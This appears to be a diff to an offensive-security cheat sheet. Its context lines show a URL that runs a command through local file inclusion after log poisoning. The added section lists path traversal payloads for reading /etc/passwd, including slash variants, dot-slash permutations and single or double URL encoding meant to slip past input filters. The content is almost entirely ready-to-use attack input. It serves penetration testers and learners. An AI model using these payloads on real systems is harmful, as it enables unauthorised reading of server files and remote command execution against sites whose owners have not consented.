@@ -17,3 +17,29 @@ Payload:
 ### 3) Execute via LFI
 
     http://example.com/vulnerable.php?page=/path/to/log/access.log&cmd=whoami
+
+## Path Traversal manual payloads
+
+Simple traversal: start with 
+
+    ../../../../etc/passwd 
+
+Try variants like : 
+
+    ..//..//..//etc/passwd 
+    
+or 
+
+    ..\/..\/..\/etc/passwd.
+
+Dot+slash permutations: 
+
+    ..././../ 
+    
+or 
+
+    ..%2f..%2f..%2fetc/passwd (URL encoded).
+
+Try Double-encoding: 
+
+URL-encode twice if the app decodes input more than once (example: %252e%252e%252f = %2e%2e%2f).
